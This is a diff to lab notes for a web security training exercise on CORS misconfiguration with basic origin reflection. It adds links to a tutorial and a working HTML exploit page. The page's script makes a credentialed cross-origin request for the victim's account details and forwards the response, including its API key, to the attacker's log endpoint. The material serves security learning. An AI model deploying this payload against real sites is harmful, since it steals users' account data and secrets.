@@ -29,6 +29,9 @@ You can log in to your own account using the following credentials: `wiener:pet
 Rana khalil: 
 Lab video:https://www.youtube.com/watch?v=XTFDst3TjMM&ab_channel=RanaKhalil
 Lab solution:https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/cors/lab-01/notes.txt
+HTML script:https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/cors/lab-01/cors-lab-01.html
+
+
 
 ```
 Lab #1 - CORS vulnerability with basic origin reflection
@@ -44,3 +47,24 @@ Testing for CORS misconfigurations:
 2.
 ```
 
+Html
+```
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = "https://0acf00c80446860280902124001f00f0.web-security-academy.net"
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE){
+                    fetch("/log?key=" + xhr.responseText)
+                }
+            }
+
+            xhr.open('GET', url + "/accountDetails", true);
+            xhr.withCredentials = true;
+            xhr.send(null)
+        </script>
+    </body>
+</html>
+```
